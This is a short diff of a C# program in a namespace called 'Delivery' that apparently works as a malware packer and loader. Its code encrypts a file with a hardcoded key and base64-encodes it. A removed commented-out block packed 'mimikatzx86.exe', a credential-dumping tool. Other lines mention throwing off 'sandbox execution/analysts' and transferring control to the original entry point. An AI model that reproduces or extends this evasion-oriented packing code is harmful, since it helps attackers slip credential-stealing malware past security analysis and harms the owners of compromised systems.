@@ -63,16 +63,9 @@ namespace Delivery
                     byte[] b  = Misc.FileToByteArray(@file);
                     byte[] e = Misc.Encrypt(b,"password");
                     string f = System.Convert.ToBase64String(e);
-                    File.WriteAllText(@"file.b64",f);
+                    //File.WriteAllText(@"file.b64",f);
                     Console.WriteLine("{0}", f);
-
-                    /*
-                    byte[] b1  = Misc.FileToByteArray(@"mimikatzx86.exe");
-                    byte[] e1 = Misc.Encrypt(b1,"password");
-                    string f1 = System.Convert.ToBase64String(e1);
-                    File.WriteAllText(@"filex86.b64",f1);
-			*/
-
+		    System.Environment.Exit(1);
                 }
             else {
                 //Add any behaviour here to throw off sandbox execution/analysts :)
@@ -384,7 +377,7 @@ namespace Delivery
             //Transfer Control To OEP
 
             //Console.WriteLine("Thread Complete");
-            //Console.ReadLine();
+            Console.ReadLine();
 
 
 
